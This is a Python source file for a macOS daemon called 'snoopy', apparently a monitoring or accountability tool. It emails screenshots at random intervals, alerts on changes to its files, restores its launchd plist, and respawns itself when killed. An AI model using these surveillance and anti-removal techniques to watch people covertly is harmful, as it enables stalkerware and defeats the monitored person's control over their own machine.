#!/usr/bin/env python

# import imp
import sys
import os
import time
import signal
import random
import base64
from lib.notifier import Notifier
from lib.secrets_manager import SecretsManager
import subprocess
from watchdog.observers import Observer
from watchdog.events import PatternMatchingEventHandler

# imp.load_source('catcher', './{}/capture.py'.format(sys.platform))
from darwin import capture as catcher

home              = os.getenv("HOME")
directory         = 'HOME_DIRECTORY'
config_dir        = '{}/config'.format(directory)
installation_path = '{}/dist/snoopy'.format(directory)
launchd_path      = '{}/Library/LaunchAgents'.format(home)
secret_key        = 'SUPER_SECRET_KEY'
mail_config       = 'mail.config'
reloader_name     = 'a.out'


def get_embedded_filename(filename):
    if hasattr(sys, '_MEIPASS'):
        # PyInstaller >= 1.6
        os.chdir(sys._MEIPASS)
        filename = os.path.join(sys._MEIPASS, filename)
    elif '_MEIPASS2' in os.environ:
        # PyInstaller < 1.6 (tested on 1.5 only)
        os.chdir(os.environ['_MEIPASS2'])
        filename = os.path.join(os.environ['_MEIPASS2'], filename)
    else:
        os.chdir(os.path.dirname(sys.argv[0]))
        filename = os.path.join(os.path.dirname(sys.argv[0]), filename)
    return filename


def get_plist_filename(s=None):
    suffix = '.{}'.format(s) if s else ""
    return 'com.reedcwilson.snoopy{}.plist'.format(suffix)


class GracefulKiller:
    def __init__(self, reloader_filename, notifier):
        signal.signal(signal.SIGHUP, self.exit_gracefully)
        signal.signal(signal.SIGINT, self.exit_gracefully)
        signal.signal(signal.SIGTERM, self.exit_gracefully)
        self.reloader = reloader_filename
        self.notifier = notifier

    def exit(self):
        time.sleep(1)
        sys.exit(0)

    def exit_gracefully(self, signum, frame):
        self.notifier.send(subject="Shutting down")
        pid = os.fork()
        if pid == 0:
            subprocess.call([self.reloader])
        self.exit()


class ConfigFileEventHandler(PatternMatchingEventHandler):
    def __init__(self, notifier, config_dir, launchd_dir, plist_filename):
        self.notifier = notifier
        self.config_dir = config_dir
        self.launchd_dir = launchd_dir
        self.plist_filename = plist_filename
        PatternMatchingEventHandler.__init__(
            self,
            patterns=["*com.reedcwilson.snoopy.plist*"],
            ignore_directories=True)

    def on_any_event(self, event):
        message = """The config file has been tampered with:
        file: {}""".format(event.src_path)
        self.notifier.send(
            subject="Alert!",
            message=message)
        config = ""
        local_config_file = '{}/{}'.format(
            self.config_dir,
            self.plist_filename)
        runtime_config_file = '{}/{}'.format(
            self.launchd_dir,
            self.plist_filename)
        with open(local_config_file, 'r') as f:
            config = f.read().replace("%INSTALL_DIR%", self.config_dir)
        with open(runtime_config_file, 'w') as f:
            f.write(config)


class InstallationEventHandler(PatternMatchingEventHandler):
    def __init__(self, notifier):
        self.notifier = notifier
        PatternMatchingEventHandler.__init__(
            self,
            patterns=["*"],
            ignore_directories=True)

    def on_any_event(self, event):
        message = """The installation directory has been tampered with.
        file: {}""".format(event.src_path)
        self.notifier.send(
            subject="Alert!",
            message=message)


class MyDaemon():
    killer = None

    def __init__(self):
        config_filename = get_embedded_filename(mail_config)
        secret_key_raw = base64.b64decode(secret_key)
        mail_secrets_manager = SecretsManager(secret_key_raw, config_filename)
        self.notifier = Notifier(mail_secrets_manager)
        self.killer = GracefulKiller(
            get_embedded_filename(reloader_name),
            self.notifier)
        self.notifier.send(subject="Starting up")

    def run(self):
        self.observer = Observer()
        config_event_handler = ConfigFileEventHandler(
            self.notifier,
            config_dir,
            launchd_path,
            get_plist_filename())
        installation_event_handler = InstallationEventHandler(self.notifier)
        self.observer.schedule(
            config_event_handler,
            launchd_path,
            recursive=False)
        self.observer.schedule(
            installation_event_handler,
            installation_path,
            recursive=False)
        self.observer.start()
        while True:
            filenames = catcher.capture(directory)
            self.notifier.send_screenshots(filenames)
            time.sleep(random.randint(120, 600))


def main():
    daemon = MyDaemon()
    daemon.run()


if __name__ == "__main__":
    main()
